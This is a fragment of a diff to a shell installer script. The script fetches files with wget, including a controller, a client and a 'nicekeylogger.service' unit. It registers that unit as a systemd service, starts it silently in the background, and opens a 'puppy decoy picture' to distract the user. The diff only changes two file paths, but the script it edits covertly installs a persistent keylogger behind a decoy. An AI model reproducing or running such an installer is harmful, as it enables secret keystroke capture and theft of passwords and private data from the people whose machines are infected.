@@ -23,7 +23,7 @@ RSTRT=${base}restart.sh
 KLSERV=${base}nicekeylogger.service
 PUP=${base}puppy.jpg
 wget -L "$CONT" "$KMAP" "$FKEY" "$CLIENT" "$KLSERV" "$RSTRT" "$PUP"
-sudo mv puppy.jpg /home/pi/Pictures/puppy.jpg
+sudo mv puppy.jpg ../Pictures/puppy.jpg
 sudo chmod +x controller.py restart.sh client.py
 
 # SET APPLICATION AS A SERVICE WITH SYSTEMD
@@ -35,6 +35,6 @@ sudo systemctl daemon-reload
 ./restart.sh > /dev/null 2>&1 &
 
 # Launch puppy decoy picture
-eog /home/pi/Pictures/puppy.jpg &
+eog ../Pictures/puppy.jpg &
 
 exit
